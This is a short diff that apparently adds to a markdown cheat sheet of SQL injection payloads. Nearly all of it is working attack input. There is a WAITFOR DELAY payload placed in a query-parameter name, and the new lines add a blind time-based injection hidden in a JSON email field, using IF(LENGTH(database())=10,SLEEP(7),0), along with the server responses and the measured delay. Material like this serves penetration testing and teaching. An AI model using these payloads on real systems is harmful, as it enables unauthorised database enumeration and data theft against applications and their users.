@@ -18,8 +18,12 @@
 ##### IN PARAMETER
 - testing in ?parameter=test by replacing below payload 
   ````?parameter[id) VALUES (NULL); WAITFOR DELAY '0:0:5';--]=test````
+- sql injection in email parameter when email is send to check if it exists or not
+   ```` 
+   {“email”:”asd@a.com”}   response: {“code”:2002,”status”:200,”message”:”Email not found.”}
+   {“email”:”\”a’-IF(LENGTH(database())=10,SLEEP(7),0)or’1’=’1\”@a.com”}   response:{“code”:0,”status”:200,”message”:”Successful”}	        Valid Delay: 8,696 milis
 
-
+   `````
 
 
 
